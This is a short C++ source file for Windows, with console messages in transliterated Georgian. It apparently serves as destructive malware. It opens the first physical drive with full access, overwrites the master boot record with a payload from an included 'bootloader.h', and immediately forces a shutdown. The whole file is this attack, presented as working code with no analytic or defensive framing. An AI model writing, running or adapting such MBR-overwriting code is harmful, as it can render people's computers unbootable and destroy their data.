#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include "bootloader.h"

int main()
{
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) {
        printf("Ver Gavxsenit Draivi\n");
        return EXIT_FAILURE;
    }

    DWORD bytes_written;
    if (!WriteFile(drive, bootloader, bootloader_len, &bytes_written, NULL)) { // Dasafixia
        printf("Ver Gadavaweret MBRs\n");
    }
    else {
        printf("Warmatebit Gadaewera %d Baiti MBRs\n", bytes_written);
    }

    CloseHandle(drive);

    Sleep(1000);
    system("C:\\Windows\\System32\\shutdown /s /t 0");
    return EXIT_SUCCESS;
}